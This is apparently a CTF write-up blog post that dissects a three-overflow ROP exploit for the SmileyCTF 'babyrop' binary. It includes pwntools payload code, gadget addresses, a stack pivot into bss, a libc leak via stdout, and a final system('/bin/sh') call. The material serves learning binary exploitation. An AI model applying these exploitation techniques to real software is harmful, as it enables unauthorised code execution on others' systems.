---
title: "SmileyCTF babyrop Writeup 3"
date: 2025-07-24 18:00:00 +0000
layout: post
categories: [CTF, Writeup, SmileyCTF, babyrop]
tags: [smileyctf, pwn, rop, return-oriented-programming, linux-binary-exploitation, binary-exploitation, buffer-overflow, stack-based-buffer-overflow, python, c, pwntools, gef]
description: "Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited gadgets"
image: "/assets/images/SmileyCTF-babyrop/smileyCTF_pic.png"
---

This is the **third solution** for the SmileyCTF-babyrop challenge, and it's the most satisfying one for me. I like to call it "**playing with memory like a master**."

### Quick recap

The PoC owner creates two carefully crafted chunks for this exploit. The first chunk is called the **Chunk Execution Workflow (CEW) chunk**, and the second is the **Chunk Execution Manager (CEM) chunk**.

I appreciate this PoC because it's **clean, clear, and robust**. The PoC overflows the buffer three times, allowing for significant manipulation of the execution flow. This is what makes it particularly special to me.

### The gadgets

I added some comments to code, hope it would help you to understand.

```python
offset      = 0x20        # rbp overwrite offset
bss         = 0x404800    # bss address the CEW chunk

gets_gadget = 0x401205    # 0x401205 <+54>:    lea    rax,[rbp-0x20]
print_gadget = 0x401211    # 0x401211 <+66>:    mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 <print>

leave_ret   = 0x401226    # 0x401226 <+87>:    leave; ret
pop_rbp     = 0x401181    # 0x401181 <gadgets+11>:       pop    rbp; ret
pop_rcx     = 0x40117e    # 0x40117e <gadgets+8>:        pop    rcx
add_bl_dh   = 0x4010bf    # 
ret         = pop_rbp + 1 # ret;
```


### 1st Overflow

The first overflow is the classic one, preparing `rbp` at `bss-0x10` and injecting the CEW payload. This gains control of `RIP`, directing execution to `gets_gadgets`.

```python
payload = flat({
    offset: [
        bss-0x10,   #set rbp to 0x4047f0
        gets_gadget # rip
    ]
}, filler=b'A')

input("Payload send set rbp 0x404058")
io.sendline(payload)

log.info(f"payload 1 output {io.recv()}")
```


### 2nd Overflow

The second payload, which I've named **CEW (Chunk Execution Workflow)**, handles the execution flow. While it might appear straightforward, there are some clever tricks at play.

If you look closely, you'll notice that we're calling gadgets within `main`. So, after `gets_gadget` is called, the program ultimately executes `leave; ret` instructions at the end of its execution.

```python
payload = flat({
    offset:[
        0x404038 + 0x20,    #0x4047f0 new rbp
        gets_gadget,        #0x4047f8 new rip

        0x404018 + 0x20,    #0x404800
        print_gadget,        #0x404808

        cyclic(0x10),       #0x404810 - 0x404818

        bss + 0x30 + 0x20,  #0x404820
        gets_gadget,        #0x404828

    ]
}, filler=b'B')

input("Payload 2")
io.sendline(payload)

log.info(f"payload 2 output: {io.recv()}")
```

This means `rsp` is no longer on the stack; it will now reside at `0x4047f8`. The calculation for this is straightforward, but I can explain it further if you're unfamiliar with it.

The first payload set `RBP` to `0x4048f0` 

![c927709f31605fa32dcf088f6ead3d59.png](/assets/images/SmileyCTF-babyrop/c927709f31605fa32dcf088f6ead3d59.png)

If we follow the execution up to the `leave; ret` instruction, **`rsp` will settle at `0x4047f8` (the new `RIP`), which is the old `rbp + 0x8`**.

![a5e9f665158dc041f3a187f15c95e13a.png](/assets/images/SmileyCTF-babyrop/a5e9f665158dc041f3a187f15c95e13a.png)

If we examine the memory layout, the `rsp` value correctly points to the CEW payload's newly settled `RIP`. The `RSP` register has indeed settled to the expected `RIP`.

![dff3da9ed38255e8b9120d2f909c241b.png](/assets/images/SmileyCTF-babyrop/dff3da9ed38255e8b9120d2f909c241b.png)

![086e0b270146e02573b63f78e8190ef8.png](/assets/images/SmileyCTF-babyrop/086e0b270146e02573b63f78e8190ef8.png)

As you've noted, the CEW (second) payload overflows the program again. This sets `rbp` to `0x404058`. At the end of `main`, the new `RSP` value will be `0x404060`.

![f248a65d7973c4659e87fceb253f7db1.png](/assets/images/SmileyCTF-babyrop/f248a65d7973c4659e87fceb253f7db1.png)


### The magic

Here's where the magic happens: the **CEM (third) payload**. This carefully crafted payload is responsible for managing the execution flow.

```python
payload  = p64(bss + 0x20)   # 0x404038
payload += p64(leave_ret)    # 0x404040
payload += b'C' * 0x10       # 0x404048 - 0x404050
payload += p64(bss)          # 0x404058
payload += p64(leave_ret)    # 0x404060

input("Payload 3")
io.sendline(payload)

io.recvline()
```


#### What exactly happens here ?

The memory layout can be seen in the memory clearly. 

```python
(remote) gef➤  x/16xg 0x404000
0x404000:       0x0000000000000000      0x0000000000000000
0x404010 <print>:       0x00007fa368d7cbe0      0x00007fa368ef95c0
0x404020 <completed.0>: 0x0000000000000000      0x0000000000000000
0x404030:       0x0000000000000000      0x0000000000404820
0x404040:       0x0000000000401226      0x4343434343434343
0x404050:       0x4343434343434343      0x0000000000404800
0x404060:       0x0000000000401226  -->here    0x0000000000000000
0x404070:       0x0000000000000000      0x0000000000000000
```

The CEW (second) payload sets **`RBP` to `0x404058`**. By the end of `main`, **`RSP` becomes `0x404060` (the new `RIP`)**, which is the address of the `leave; ret` instruction.

![3e204f35aaeea3a13081d7b537d648c2.png](/assets/images/SmileyCTF-babyrop/3e204f35aaeea3a13081d7b537d648c2.png)

So, what's in the stack? The answer is `0x404800`. After the `leave` instruction executes, `RSP` will become `0x404068`, and `RBP` will become `0x404800`.

![68067f2aea922bf58d2face106a0f2ff.png](/assets/images/SmileyCTF-babyrop/68067f2aea922bf58d2face106a0f2ff.png)

After execution of `leave`  

![1ba79462811cf14ce2d84b2a426fa54c.png](/assets/images/SmileyCTF-babyrop/1ba79462811cf14ce2d84b2a426fa54c.png)

As the screenshot above indicates, another `leave; ret` instruction appears. Where did it come from? The answer lies in the CEM (third) payload.

**So, where does the execution redirect?**

The math dictates that `RSP` will become `0x404808` (the new `RIP`) before the `ret` instruction executes. What about the `RBP` register value? It will become the address inside of `$RBP-0x8`.

- The address `0x404800` contains `0x404038`, which is the start of the CEW (second) payload.
    
- The execution will redirect to the `RSP` value, which is `0x404808` (the new `RIP`).
    
- Which gadget exists inside `0x404808`? The `print_gadget` from the CEW (second) payload.


![dd8b52422e9ddad8afd9f038a8b2430b.png](/assets/images/SmileyCTF-babyrop/dd8b52422e9ddad8afd9f038a8b2430b.png)

### What exactly happened here ? 

Simply put, the CEM (third) payload redirects execution to the `print_gadget` (4th index) within the CEW (second) payload, with `RBP` properly settled at `0x404038`.

Let's re-examine what the `print_gadget` does. As you can see below, it's printing the address `0x00007f44f8c675c0`, which is the LIBC address of `_IO_2_1_stdout_`. 

![784e635d6dff9459dee2963e4eda4d93.png](/assets/images/SmileyCTF-babyrop/784e635d6dff9459dee2963e4eda4d93.png)

The calculated `LIBC Address` 

![be36f9c1517684db2f9910501cf54693.png](/assets/images/SmileyCTF-babyrop/be36f9c1517684db2f9910501cf54693.png)


The `print_gadget` and `gets_gadget` reside within the `main` function. This means that each time they are called, we manipulate `RSP` and `RBP`.

- **What was the `RBP` value?** `0x404038`.
    
- **What will `RBP` become?** The address contained within `0x404038`, which is the start of the CEM (third) payload: `0x404820`.
    
- **What will `RSP` become?** `0x404040` (the new `RIP`), which points to the CEM (third) payload's second index, specifically `leave_ret`.
    

This is precisely why I named the third payload "Chunk Execution Manager." Its sole purpose is to redirect execution precisely where the attacker desires.

![e164f0188cafcfd2051b1ecad61553ce.png](/assets/images/SmileyCTF-babyrop/e164f0188cafcfd2051b1ecad61553ce.png)

Let's break down what happens after the `leave` instruction executes, based on your provided information:

- **`RBP` will become `0x404850`**. This value, which was originally at `0x404820` (the location `RBP` pointed to just before `leave`), now points to the 5th index of the CEW (second) payload.
    
- **`RSP` will become `0x404828` (the new `RIP`)**. This means the execution flow will jump to the 6th index of the CEW (second) payload, which you've indicated is the `gets_gadget`.
    

In essence, the `leave` instruction is facilitating a transition, directing both `RBP` and `RSP` to new locations that will guide the subsequent execution flow. The `RBP` is set up to point to a specific part of the CEW payload, while `RSP` is now poised to execute the `gets_gadget` from that same payload.

```python
(remote) gef➤  x/16xg 0x4047d0
0x4047d0:       0x0000000000000001      0x00007ffd67a78fd8
0x4047e0:       0x0000000000000001      0x0000000000000000
0x4047f0:       0x0000000000403dc8      0x00007ff222e6c000
0x404800:       0x0000000000404038      0x0000000000401221
0x404810:       0x6161616261616161      0x6161616461616163

0x404820:       0x0000000000404850      0x0000000000401205 --> here

0x404830:       0x0000000000000000      0x0000000000000000
0x404840:       0x0000000000000000      0x0000000000000000
0x404850:       0x0000000000000000      0x0000000000000000
0x404860:       0x0000000000000000      0x0000000000000000
```

The address `0x404850` is a null memory area within the `bss` section. The PoC creator ensures that the fourth payload will be placed at this address.

Remember, the payload calls `gets_gadget` again! This means that `leave_ret` will execute once more at the end of the execution.

### Final 3rd Overflow

The final payload is quite straightforward. Using the LIBC base address, it locates the `pop rdi; ret` gadget, the `/bin/sh\0` string, and the `system` gadget.

The buffer is then overflowed again. Subsequently, `RBP` is set to `0`, `rdi` is set to the "/bin/sh\0" string, `RSP` is aligned to 8 bytes with a `ret` gadget, and finally, `__libc_system` is called.

```python
libc.address = u64(io.recv()[:-1].ljust(0x8, b'\0')) - 0x2045c0
log.success('libc base @ %#x', libc.address)

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
#
payload = flat({
    offset: [
        0,        # ---------------------> #0x404850
        pop_rdi,  # ---------------------> #0x404858
        next(libc.search(b'/bin/sh\0')),   #0x404860
        ret,      # ---------------------> #0x404868
        libc.sym.system                    #0x404870
    ]
})
#
input("Payload 4")
io.sendline(payload)
```

Here's a breakdown of the calculations and their impact on memory:

- The last `RBP` value was `0x404850`, which marks the start of the 4th payload.
    
- The `RSP` value will become `0x404858` (the new `RIP`), pointing to the 2nd index of the 4th payload, which is the `pop rdi; ret` gadget.
    
- The new `RBP` value is settled to `0x0`.

![ffb88aa181170a92593fa4448a844552.png](/assets/images/SmileyCTF-babyrop/ffb88aa181170a92593fa4448a844552.png)


### Conclusion


This PoC's payload is **strictly connected and well-structured**. In the world of Return-Oriented Programming (ROP), I typically avoid messing with the `RSP`, but analyzing this PoC was both fun and great practice.

As the PoC creator noted, "This is a ROP challenge, so there are many ways to solve it."

![e272caf856fa05702c2f828b6279ceb2.png](/assets/images/SmileyCTF-babyrop/e272caf856fa05702c2f828b6279ceb2.png)

Credit: `lyn`
